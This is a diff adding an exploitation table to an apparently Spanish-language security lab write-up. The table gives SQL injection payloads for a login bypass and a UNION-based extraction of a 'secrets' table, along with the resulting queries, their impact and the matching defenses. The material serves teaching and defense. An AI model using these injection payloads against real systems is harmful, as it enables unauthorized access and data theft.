@@ -36,3 +36,9 @@ código fuente del target.
 [ OK ] ¡Lab 07 COMPLETO! Ponete las pilas con la próxima unidad.
 ```
 
+## 2. Tabla de explotación
+
+| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
+|---|---|---|---|---|
+| SQLi auth (R1) | `user=admin' -- ` / `pass=x` | `SELECT user, rol FROM users WHERE user='admin' -- ' AND pass='x'` | Login como `admin` sin conocer su contraseña; acceso total al panel de administración | Consultas parametrizadas / *prepared statements* (nunca concatenar el input en el SQL) |
+| SQLi UNION (R2) | `q=' UNION SELECT clave,valor FROM secrets -- ` | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%' UNION SELECT clave,valor FROM secrets -- %'` | Extracción completa de la tabla `secrets` (fuera del alcance previsto del buscador) | Consultas parametrizadas; además, principio de mínimo privilegio en el usuario de BD de la app (sin acceso a tablas que no necesita) |
